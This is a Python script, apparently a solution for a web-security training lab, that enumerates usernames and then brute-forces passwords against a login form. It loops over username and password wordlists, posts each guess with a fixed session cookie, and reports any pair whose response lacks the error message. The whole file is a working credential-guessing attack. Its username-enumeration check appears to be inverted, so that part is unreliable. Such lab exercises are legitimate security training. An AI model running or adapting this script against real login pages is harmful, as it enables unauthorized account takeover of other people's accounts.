import requests
import sys

url = "https://accd1f1e1e5d1661c06714a600ef00b8.web-security-academy.net/login"
cookie = {'session':'nFx1GSc6Qvp4EdZyIEKwSEDU3w5aLQrM'}

post_data = ""
#proxy = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

hit = "Invalid username or password."


#FIND USERNAME WITH BELOW SNIPPET THEN FIND THE PASSWORD with the lower snippet Comment out lower one first
#or make function definations for the below code to get user and pass without commenting one by one
with open('usernames.txt') as f:
	for users in f:
		user = users.strip()
		post_data = {'username':f'{user}','password':'pass'}
		r = requests.post(url, data = post_data, cookies=cookie)

		if hit in r.text:
			print(f"[+]Username Found: {user}")
			break


with open('usernames.txt') as f:
	for usernames in f:
		user = usernames.strip()
		with open('passwords.txt') as e:
			for passwords in e:
				password = passwords.strip()
				sys.stdout.write(f"\r[+]Username: {user}  [+]Password: {password}")
				post_data = {'username':user,'password':password}
				r = requests.post(url, data=post_data, cookies=cookie)
				#debug
				#r = requests.post(url, data=post_data, cookies=cookie, proxies=proxy, verify=False)

				if hit not in r.text:
					print(f"\n[+]Cracked {user}:{password}")
					break
